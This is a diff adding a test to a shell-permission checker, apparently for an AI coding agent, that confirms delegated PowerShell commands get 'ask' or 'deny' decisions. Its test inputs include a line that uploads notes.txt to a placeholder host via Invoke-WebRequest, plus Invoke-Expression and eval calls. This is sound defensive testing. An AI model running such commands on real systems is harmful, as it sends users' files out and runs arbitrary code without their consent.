@@ -8,6 +8,7 @@ import { checkShellPermission } from "../../__tests__/support/permission-lane.js
 import { inspectShellCommand } from "../rules/shell-exfiltration.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { __resetSessionStoreForTest } from "../user-approval-store.js";
+import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
 import type { ShellRuleDialect } from "../../shared/permissions-events.js";
 let cwd: string;
 let manager: PermissionManager;
@@ -47,5 +48,17 @@ it.each(["–", "—", "―"])("refuses unsupported parameter punctuation %s rat
     expect(inspectPowerShellCommand(command, cwd).outcome).toBe("unproven");
     expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
     expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", true, true).decision).toBe("deny");
+  }
+});
+it.each(["env Write-Output ready", "env iwr -Uri https://x.invalid -InFile notes.txt", "npx Write-Output ready", "npm exec -- Invoke-Expression 'dir'", "env eval 'ls'", "command Write-Output ready", "builtin Write-Output ready"])("does not use shell grammar for a delegated native command: %s", (command) => {
+  manager.setRules([
+    { pattern: "*", action: "allow" },
+    withCurrentShellRuleVersion({ pattern: `PowerShell(${command})`, action: "allow" }),
+  ]);
+  expect(inspectPowerShellCommand(command, cwd).outcome).toBe("unproven");
+  expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
+  for (const sandboxed of [false, true]) {
+    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed, true)).toMatchObject({ decision: "deny", layer: 2 });
   }
 });
